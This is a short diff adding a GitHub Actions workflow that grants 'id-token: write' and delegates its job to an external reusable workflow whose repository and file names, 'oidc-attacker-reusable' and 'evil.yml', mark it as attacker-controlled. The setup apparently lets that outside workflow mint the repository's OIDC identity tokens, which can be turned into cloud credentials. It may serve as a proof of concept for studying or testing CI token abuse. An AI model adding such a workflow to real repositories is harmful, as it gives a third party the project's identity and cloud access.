@@ -1,0 +1,12 @@
+name: external-caller
+
+on:
+  workflow_dispatch:
+
+permissions:
+  id-token: write
+  contents: read
+
+jobs:
+  call-external:
+    uses: LiamConner10/oidc-attacker-reusable/.github/workflows/evil.yml@main
